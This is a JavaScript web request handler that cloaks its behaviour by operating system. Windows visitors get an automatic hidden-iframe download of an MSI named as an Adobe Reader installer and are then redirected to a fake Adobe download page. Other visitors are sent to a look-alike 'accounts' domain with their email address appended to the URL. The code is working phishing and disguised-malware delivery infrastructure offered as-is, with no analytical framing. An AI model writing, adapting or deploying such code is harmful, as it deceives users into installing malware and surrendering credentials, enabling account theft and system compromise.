export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
  const MSI_PATH = '/Reader_en_install.msi';           // must exist in /public
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // target where &smn=email goes

  const emailFromQuery = Array.isArray(req.query.email) ? req.query.email[0] : (req.query.email || '');
  const safeServerEmail = emailFromQuery ? encodeURIComponent(emailFromQuery) : '';

  if (isWindows) {
    const html = `<!DOCTYPE html>
      <html>
        <head><meta charset="utf-8"><title>Preparing download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            try {
              const iframe = document.createElement('iframe');
              iframe.style.display = 'none';
              iframe.src = ${JSON.stringify(MSI_PATH)};
              document.body.appendChild(iframe);
            } catch(e) { console.error(e); }

            setTimeout(() => {
              window.location.href = ${JSON.stringify(WINDOWS_REDIRECT_AFTER_DOWNLOAD)};
            }, 3000);
          </script>
          <noscript>
            <p>Please <a href="${MSI_PATH}">click here to download</a>.</p>
            <meta http-equiv="refresh" content="5;url=${WINDOWS_REDIRECT_AFTER_DOWNLOAD}">
          </noscript>
        </body>
      </html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows: append email as &smn=...
  const clientHtml = `<!DOCTYPE html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <p>Redirecting…</p>
        <script>
          (function(){
            var base = ${JSON.stringify(NON_WINDOWS_TARGET)};
            var email = ${JSON.stringify(safeServerEmail)};
            var sep = base.includes('?') ? '&' : '?';
            var finalUrl = email ? base + sep + 'smn=' + email : base;
            window.location.replace(finalUrl);
          })();
        </script>
        <noscript>
          <meta http-equiv="refresh" content="0;url=${NON_WINDOWS_TARGET}">
        </noscript>
      </body>
    </html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(clientHtml);
}
